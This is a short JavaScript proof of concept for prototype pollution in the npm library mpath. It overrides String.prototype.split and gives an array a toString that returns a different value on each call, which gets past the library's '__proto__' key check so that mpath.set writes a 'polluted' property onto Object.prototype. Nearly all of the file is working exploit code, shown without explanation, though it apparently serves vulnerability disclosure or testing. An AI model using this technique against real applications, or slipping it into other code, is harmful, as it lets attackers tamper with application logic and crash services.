var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
var mpath = require('mpath');
var obj = {};
console.log({}.polluted);
mpath.set('__proto__.polluted', 'yes', obj);
console.log({}.polluted);